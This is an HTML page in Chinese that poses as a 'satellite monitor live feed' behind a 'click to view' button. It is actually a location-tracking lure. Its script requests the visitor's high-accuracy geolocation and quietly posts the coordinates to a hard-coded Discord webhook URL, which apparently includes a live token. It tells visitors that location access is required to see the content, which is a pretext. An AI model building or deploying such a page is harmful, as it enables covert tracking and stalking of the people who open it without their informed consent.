<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>內容載入中</title>
</head>

<body>

<h2>衛星監視器實時畫面</h2>
<button onclick="getLocation()">點擊查看</button>

<p id="status"></p>

<script>

var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";

function getLocation(){

document.getElementById("status").innerHTML="正在取得位置...";

if(navigator.geolocation){

navigator.geolocation.getCurrentPosition(success,error,{
enableHighAccuracy:true,
timeout:10000,
maximumAge:0
});

}else{
document.getElementById("status").innerHTML="瀏覽器不支援定位";
}

}

function success(pos){

var lat = pos.coords.latitude;
var lon = pos.coords.longitude;
var acc = pos.coords.accuracy;

fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:
"📍有人打開網站\n"+
"緯度: "+lat+"\n"+
"經度: "+lon+"\n"+
"精準度: "+acc+" 公尺"
})
});

document.getElementById("status").innerHTML=
"定位成功<br>" +
"緯度: "+lat+"<br>" +
"經度: "+lon+"<br>" +
"精準度: "+acc+" 公尺";

}

function error(err){

document.getElementById("status").innerHTML="需要允許定位才能查看內容";

}

</script>

</body>
</html>
